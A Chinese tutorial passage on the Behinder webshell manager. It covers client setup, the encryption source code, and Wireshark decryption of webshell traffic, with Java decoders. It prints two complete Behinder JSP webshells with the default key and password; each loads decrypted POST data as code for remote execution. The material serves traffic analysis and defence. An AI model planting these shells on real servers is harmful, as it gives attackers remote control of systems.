#  WebShell管理工具讲解

## 冰蝎

### 思维导图

![FDCC692F089F5246D0973CF5E889D07F](https://image.201068.xyz/assets/7.WebShell管理工具讲解/FDCC692F089F5246D0973CF5E889D07F.png)

### BehinderClientSource

#### 运行冰蝎

github：https://github.com/MountCloud/BehinderClientSource

```bash
git clone https://github.com/MountCloud/BehinderClientSource.git
```

> jdk版本：jdk1.8
>
> 如果爆数据库文件不存在，就把data.db复制到项目根目录。

![image-20241030122720379](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030122720379.png)

#### 冰蝎连接

![image-20241030143857493](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030143857493.png)

```bash
http://192.168.70.21:81/shell.php
rebeyond
```

![image-20241030140751055](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030140751055.png)

![image-20241030144035538](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030144035538.png)



### 源码分析

#### ShellService

通过`ShellService`类发起调用

![image-20241030201809562](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030201809562.png)

`equals`方法是起点

##### getCryptor

加密器选择

![image-20241030203541086](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030203541086.png)

#### CustomCryptor

自定义加密器

![image-20241030205850872](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030205850872.png)

![image-20241030210004309](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030210004309.png)

##### 传输协议 TransProtocol 

1. aes_with_magic.config，
2. default_aes.config，
3. default_image.config，
4. default_json.config，
5. default_xor.config，
6. default_xor_base64.config

![image-20241030205310454](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030205310454.png)

#### LegacyCryptor

传统加密，

jsp,aes加密

![image-20241030203925335](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030203925335.png)

```bash
   public LegacyCryptor(String type, int encryptType, String key) throws Exception {
      this.type = type;
      this.encryptType = encryptType;
      this.key = key;
      if (this.type.equals("asp")) {
         this.encryptType = Constants.ENCRYPT_TYPE_XOR;
      }

      if (this.encryptType == Constants.ENCRYPT_TYPE_AES) {
         this.localTransProtocol = this.transProtocolDao.findLegacyTransProtocolByTypeAndName("jsp", type + "_aes");
      } else if (this.encryptType == Constants.ENCRYPT_TYPE_XOR) {
         this.localTransProtocol = this.transProtocolDao.findLegacyTransProtocolByTypeAndName("jsp", type + "_xor");
      }

      this.updateKey(this.localTransProtocol);
      List transProtocolList = this.transProtocolDao.findTransProtocolsById(this.localTransProtocol.getId());
      Iterator var5 = transProtocolList.iterator();

      while(var5.hasNext()) {
         TransProtocol transProtocol = (TransProtocol)var5.next();
         this.transProtocolMap.put(transProtocol.getType(), transProtocol);
         this.updateKey(transProtocol);
      }

   }
```

jsp脚本有`ENCRYPT_TYPE_AES`使用AES加密

##### updateKey

加密解密都使用密钥：`e45e329feb5d925b`

![image-20241030204357300](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030204357300.png)

> key：e45e329feb5d925b

##### 加解密

![image-20241030204703250](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030204703250.png)

![image-20241030204827607](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030204827607.png)

#### Crypt

##### Encrypt

jsp

![image-20241030203119659](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030203119659.png)

![image-20241030203139649](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030203139649.png)

> AES/ECB/PKCS5Padding

##### Decrypt

jsp

![image-20241030203236993](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030203236993.png)

###### DecryptForJava

![image-20241030203404206](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030203404206.png)

```java
public static byte[] DecryptForJava(byte[] bs, String key) throws Exception {
      int magicNum = getMagicNum(key);
      bs = Arrays.copyOfRange(bs, 0, bs.length - magicNum);
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(2, skeySpec);
      byte[] decrypted = cipher.doFinal(bs);
      return decrypted;
}
```



#### 默认JSP脚本的解密函数

```java
package myDecode;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.util.Base64;

public class AESDecryption {
    public static void main(String[] args) {
        try {
            // 密文
//            String encryptedText = "mAUYLzmqn5QPDkyI5lvSp0fjiBu1e7047YjfczwY6j7xk5Yl6c/GMDjpjMPvtPNF8U98FWdrO1R8TXMEdAFXCEJs0cHRU6XHmQAyIBdaz12gm/D7BeaYRwGS3eCukfGwLTUMYLmyJKAgJq+tgE2zSg==";
            String encryptedText = "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";
            // 密钥（16字节）
            String key = "e45e329feb5d925b";

            // 解码密钥
            SecretKeySpec secretKey = new SecretKeySpec(key.getBytes(), "AES");

            // 初始化解密（无IV）
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, secretKey, new IvParameterSpec(new byte[16])); // 不传IV，使用默认的全0向量
            byte[] decodedEncryptedText = Base64.getDecoder().decode(encryptedText);
            byte[] originalBytes = cipher.doFinal(decodedEncryptedText);
            String decryptedText = new String(originalBytes);


            // 输出解密后的明文
            System.out.println("AES解密:" + decryptedText);

            //结果有两种，一种是有包含"base64_decode，一种是包含{"status":"需要进行判断，结果有两种，一种是有包含"base64_decode，一种是包含{"status":"需要进行判断，
            //情况1

            if (decryptedText.contains("base64_decode")) {
                // 提取 Base64 编码的部分并解码
                String base64Part = decryptedText.split("base64_decode\\('")[1].split("'")[0]; // 提取 Base64 字符串
                byte[] decodedBytes = Base64.getDecoder().decode(base64Part);
                String decodedString = new String(decodedBytes);

                // 输出解码后的字符串
                System.out.println("Base64解密: " + decodedString);
            } else {

                //情况2
                // 解析 JSON 字符串（可以使用更精确的 JSON 解析方式，示例中使用简单的字符串操作）
                String encodedStatus = decryptedText.substring(decryptedText.indexOf("\"status\":\"") + 10, decryptedText.indexOf("\",\"msg\""));
                String encodedMsg = decryptedText.substring(decryptedText.indexOf("\"msg\":\"") + 7, decryptedText.lastIndexOf("\""));

                // Base64 解码 status 和 msg
                String decodedStatus = new String(Base64.getDecoder().decode(encodedStatus));
                String decodedMsg = new String(Base64.getDecoder().decode(encodedMsg));

                // 输出解码后的内容

                System.out.println("Base64解码：{\"status\":\"" + decodedStatus + "\",\"msg\":\"" + decodedMsg);
            }


        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```



### DB.Browser.for.SQLite

![image-20241030122630281](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030122630281.png)

### Wireshark流量分析

#### default_xor_base64

##### shell.jsp

```java
<%@page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*" %>
<%!
private byte[] Decrypt(byte[] data) throws Exception
{
     byte[] decodebs;
        Class baseCls ;
                try{
                    baseCls=Class.forName("java.util.Base64");
                    Object Decoder=baseCls.getMethod("getDecoder", null).invoke(baseCls, null);
                    decodebs=(byte[]) Decoder.getClass().getMethod("decode", new Class[]{byte[].class}).invoke(Decoder, new Object[]{data});
                }
                catch (Throwable e)
                {
                    baseCls = Class.forName("sun.misc.BASE64Decoder");
                    Object Decoder=baseCls.newInstance();
                    decodebs=(byte[]) Decoder.getClass().getMethod("decodeBuffer",new Class[]{String.class}).invoke(Decoder, new Object[]{new String(data)});

                }
    String key="e45e329feb5d925b";
	for (int i = 0; i < decodebs.length; i++) {
		decodebs[i] = (byte) ((decodebs[i]) ^ (key.getBytes()[i + 1 & 15]));
	}
	return decodebs;
}
%>
<%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return
        super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            byte[] buf = new byte[512];
            int length=request.getInputStream().read(buf);
            while (length>0)
            {
                byte[] data= Arrays.copyOfRange(buf,0,length);
                bos.write(data);
                length=request.getInputStream().read(buf);
            }
            /* 取消如下代码的注释，可避免response.getOutputstream报错信息，增加某些深度定制的Java web系统的兼容濿
            out.clear();
            out=pageContext.pushBody();
            */
            out.clear();
            out=pageContext.pushBody();
        new U(this.getClass().getClassLoader()).g(Decrypt(bos.toByteArray())).newInstance().equals(pageContext);}
%>
```

> jsp木马解密是：先base64解密，再XOR异或

##### nisp-behinder.pcapng

```bash
key：e45e329feb5d925b
加密方式：default_xor_base64
```

![image-20241030091716905](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030091716905.png)

![image-20241030091736123](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030091736123.png)

##### 冰蝎解密

先Base64,再XOR

###### 解密函数源码

![image-20241030092430019](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030092430019.png)

```JAVA
private byte[] Decrypt(byte[] data) throws Exception
{
     byte[] decodebs;
        Class baseCls ;
                try{
                    baseCls=Class.forName("java.util.Base64");
                    Object Decoder=baseCls.getMethod("getDecoder", null).invoke(baseCls, null);
                    decodebs=(byte[]) Decoder.getClass().getMethod("decode", new Class[]{byte[].class}).invoke(Decoder, new Object[]{data});
                }
                catch (Throwable e)
                {
                    baseCls = Class.forName("sun.misc.BASE64Decoder");
                    Object Decoder=baseCls.newInstance();
                    decodebs=(byte[]) Decoder.getClass().getMethod("decodeBuffer",new Class[]{String.class}).invoke(Decoder, new Object[]{new String(data)});

                }
    String key="e45e329feb5d925b";
	for (int i = 0; i < decodebs.length; i++) {
		decodebs[i] = (byte) ((decodebs[i]) ^ (key.getBytes()[i + 1 & 15]));
	}
	return decodebs;
}
```

###### AES解密

![image-20241030092509803](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030092509803.png)



```bash
{"status":"c3VjY2Vzcw==","msg":"Q3lWSEhOWGc4SWhDMkh6ZjdPTkZtY2RZR3NmTVRMOG5XRTMyTm5oNjFrSzVYRmhxMU9MVjBETDZNcDhRZk1wRkFPc3NCdTd0b2FBa1BHTHJRTWhNMDVUdUxSUTV4NGJIdlNXVjdGREd3MEpicVc1eFlXakFqbG1PVnFCTldjOVI0MG52b0FwWFVNT292WWl0NHZmaURPVHBoTTVhSVZCUjJlS2Y0U2IyVHVPYUNrckl5Z0hGRjBhYVQ2djlQVlNaMlpnazhDNzBlTERoNEZnQXpsNm14UUJKY21iZ0JUQno3TDNGdzNtc0lteDFWRXdmMUZHenlrR2JPQVI4OE9RajhLUGFWUTZBVWVKM2paRGVXczNobTJYZnVkS0JBeFRBb1FwVGhMU05WaFRyR3owbkZleWZXcVNVSmxtN3RQUnBDeDdZTUx6ZWw2dkZrRFVVUWFXdm9JV3VhM1g3RnY5SUs3UFFhcHpLWGRvQ1JPTlpUWTNEbWJUZFl5TlhzWHhrekxnU1BTdDEzYzF3N3hkeGhCRERxQmliR0M2OWcybXpCWnhkYmxaRWFwWWZNaGRsRjYzcjRaU1B2RklueGQxb3RWbXBJSkhXcUNiOEJScUtkOHQyc2t4UEFZc0M5VE1hRDc1MmVTSGx3ZHBiY05vY2htTGRXQjF2UTVpQWJkVFNTUEhZOWZac2ZmZ2FDWUlHZ01VY21QZEFhTzhoUDhSNEZjRVNGVGZndW1PSXhOQzNrSlh3NEE2eEp0cGVhQ2huelVkZVk2T2RYU3VCRzg5WFI5R1dKcnRmUjZwaE93eHdEZHVNdmJmV2d1QkpCd0FUR2NQRFJ4MHBMSGFBaWJpWEM5NTU3UW4yTVo5cWo3UE1EY1JuYkZCUmpjaFd5MU01ZENSVnlTd0w0Wm9DZGMzT2YzdTh6OHpZb0twNzhLTTM3VHpHZHZrcXNuRGI5MVVzT1FybVMwajFjTmdSbXZyaGZX"}
```

###### Base64解码



##### 解密函数

```bash
package myDecode;

import java.util.Base64;

public class BehinderDecryptorXOR {

    // 冰蝎的密钥
    private static final String KEY = "e45e329feb5d925b";

    // 解密方法，使用 XOR 解密和 Base64 解码
    public static String decrypt(String encryptedData) throws Exception {
        // Base64 解码
        byte[] decodebs = Base64.getDecoder().decode(encryptedData);

        // XOR 解密
        byte[] keyBytes = KEY.getBytes();
        for (int i = 0; i < decodebs.length; i++) {
            decodebs[i] = (byte) (decodebs[i] ^ keyBytes[(i + 1) & 15]);
        }

        return new String(decodebs, "UTF-8");
    }

    public static void main(String[] args) {
        String encryptedData = "TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEdlBglkYXwOKjVyBw1hYgoheV4NBWhTAjU2Xj5NawcwP2YGK15mbzQoLXJRYWBhLxxgWFBcfFMgFzFPMmBgWAodeWBcfmRTJCA2cT53UXEKN25eVERgUiA1AQYqelZhBlVWByNxUwgkLTZ9LmtmYgoreXEzZlZsHjY3YTINfHIoLFBZK2tkUwIiMHAACn9wEgxXYwYCV38KPQNeIkhQclM1YlsjcGZVAg8tYy0Jf3JXV1YFI0RlfzArNgddC2ViDlV6fT9eU2w0NTR9JlZmYTQNZ2M/cGdTLAkxBz0JZwcrHGJ9M2NrbCgXAV4IDGgFCiJmXydba283VwZfCGhkWSwEeVkVXVNDDiEsTyZVZnAwCnpwP11jYRYWLFhVDWdgKC5tB1RaaAksMDNbCwpmcSwiUE8rR1EJChEHcSJuYG0GCHlgP3tXVwoXMAcuaWNjK1F7cFxhU1MOKTdyIm5nYTgnYmIzeH8LFgQwcjJhUU8sClZhL2poVzAOMQUue1dzMCdWBCNEZH4OKDcFUW5TczAcZgYKRFBSPAkHYj5hUWMsM2dYHUd8CjQ0N1smfVdxBj9gYB0FaG4RVwZePktgczQzYWIja1ZUXy80BjJRfwQFVmZbPAZhbBVWN3MiUVF9EiljcjdFYwgsNTZZFGxlYSwgVmIvZmh/ClA2WQxDZX0KF1FeHV1nCCQxBnEhQ2tPJFZ6Bg1YV34OJjBwNkFjWA4MZgUoAX1uBRwAbRR6ZVsKDm1YHVJgbiASNWI+d1NyMBZmXzxJUVM0BDcEJgtgXg4QUXI0S1AKNDIAbSZzYV4KPVdgK1p9fCw2AWAQUn19MxxXBxEHZ3wgPwEFKQxkcFMNZnEGAn9UMDExchwKaH0gDG0FUEVrCw4RNnI2YWNfJFdhYTNDY24sDjRzKm1ncAo/e2I/UlELPAg4ByJ9ZWAOLW4FVGVrC1c0OHAiUWZPCgphcQ1gfHw8DzBjKn5kcjgLUGJUY2FhDiozTypLYVkKVnpwIAFXfBZVAXIyUWMHChBRWTNYaG8NVzYHNmBnBjQmZk8CBmV/L1AwBAByUVswCGFfP0RTfF9WB30AfGh9NCtQWC9eZAsCVDNeFHpWBSQwZgcrYmB/LFEvfSZ0YXIkJ1ViL0NlfCtQLGExCmdiVhxgYwoGUW4JVjdwVXxrBCgQbV4/cGdUFg8DcwAMf2BSVG5wK2BkVwoxBgUTCWVYWyFucihJZgs/HwZhDA99fRI/VgURRHxDDik2YSkKZH0SLW59P0FRYSgQMHItDH9jNB9gBCNKUG8rEgNfIlNmWAY2Vm0/SlN+PD1ASA==";  // 替换为实际加密数据
        try {
            String decryptedData = decrypt(encryptedData);
            System.out.println("解密后的数据: " + decryptedData);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```

###### 解密结果

![image-20241030161134598](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030161134598.png)

#### 默认加密方式

##### shell.jsp

```java
<%@page import="javax.crypto.Cipher,javax.crypto.spec.SecretKeySpec" %>
<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }

        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
%><%
    if (request.getMethod().equals("POST")) {
        String k = "e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
        session.putValue("u", k);
        Cipher c = Cipher.getInstance("AES");
        c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
        new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
    }
%>
```

> 加密算法：AES
>
> 编码：Base64
>
> 加密方式：先AES加密，再Base64编码
>
> 解密方式：先Base64解码后再解密

##### 冰蝎流量

![image-20241030165749191](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030165749191.png)

##### 冰蝎加密函数源码

![image-20241030170542362](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030170542362.png)

> AES/ECB/PKCS5Padding

![image-20241030170514833](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030170514833.png)

##### 在线解密

###### AES解密

http://tools.bugscaner.com/cryptoaes/

![image-20241030170918463](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030170918463.png)

###### Base64解码

http://tools.bugscaner.com/base64/

![image-20241030171230018](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030171230018.png)

##### 解密函数

```bash
package myDecode;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.util.Base64;

public class AESDecryption {
    public static void main(String[] args) {
        try {
            // 密文
            String encryptedText = "mAUYLzmqn5QPDkyI5lvSp0fjiBu1e7047YjfczwY6j7xk5Yl6c/GMDjpjMPvtPNF8U98FWdrO1R8TXMEdAFXCEJs0cHRU6XHmQAyIBdaz12gm/D7BeaYRwGS3eCukfGwLTUMYLmyJKAgJq+tgE2zSg==";
//            String encryptedText = "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";
            // 密钥（16字节）
            String key = "e45e329feb5d925b";

            // 解码密钥
            SecretKeySpec secretKey = new SecretKeySpec(key.getBytes(), "AES");

            // 初始化解密（无IV）
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, secretKey, new IvParameterSpec(new byte[16])); // 不传IV，使用默认的全0向量
